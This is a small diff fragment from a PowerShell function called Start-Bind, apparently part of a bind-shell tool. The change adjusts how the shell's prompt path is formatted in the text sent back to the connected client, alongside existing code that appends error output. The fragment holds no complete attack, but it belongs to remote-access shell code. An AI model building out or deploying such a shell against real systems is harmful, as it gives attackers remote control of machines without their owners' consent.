@@ -166,7 +166,7 @@ Function Start-Bind {
 
                    }  # End Catch
 
-                   $SendBack2  = $SendBack + 'PS ' + (Get-Location | Select-Object -Property 'Path') + '> '
+                   $SendBack2  = $SendBack + 'PS ' + (Get-Location | Select-Object -ExpandProperty 'Path') + '> '
                    $x = ($Error[0] | Out-String)
                    $Error.clear()
                    $SendBack2 = $SendBack2 + $x
